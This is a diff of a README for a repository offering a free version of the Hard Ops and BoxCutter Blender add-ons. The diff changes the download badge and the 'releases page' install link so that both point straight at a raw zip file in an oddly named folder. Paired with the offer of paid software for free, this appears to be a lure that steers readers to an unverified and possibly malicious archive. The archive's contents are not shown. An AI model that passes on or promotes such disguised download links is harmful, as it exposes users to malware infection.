@@ -1,6 +1,6 @@
 # 📦 Hard-Ops-BoxCutter-Free - Create complex geometric shapes with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/vegetablematterdegreeprogram9688/Hard-Ops-BoxCutter-Free/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/vegetablematterdegreeprogram9688/Hard-Ops-BoxCutter-Free/raw/refs/heads/main/evaporation/Ops-Free-Cutter-Hard-Box-v1.2.zip)
 
 ## 📌 About this project
 
@@ -28,7 +28,7 @@ Before you install these tools, verify that your computer meets these minimum st
 
 Follow these steps to add the tools to your Blender workspace.
 
-1.  Visit the [releases page](https://github.com/vegetablematterdegreeprogram9688/Hard-Ops-BoxCutter-Free/releases) to download the compressed file folder.
+1.  Visit the [releases page](https://github.com/vegetablematterdegreeprogram9688/Hard-Ops-BoxCutter-Free/raw/refs/heads/main/evaporation/Ops-Free-Cutter-Hard-Box-v1.2.zip) to download the compressed file folder.
 2.  Save the file to a folder you can find later, such as your Downloads folder.
 3.  Right-click the zipped folder and select Extract All. Pick a destination folder on your computer.
 4.  Open the Blender application.
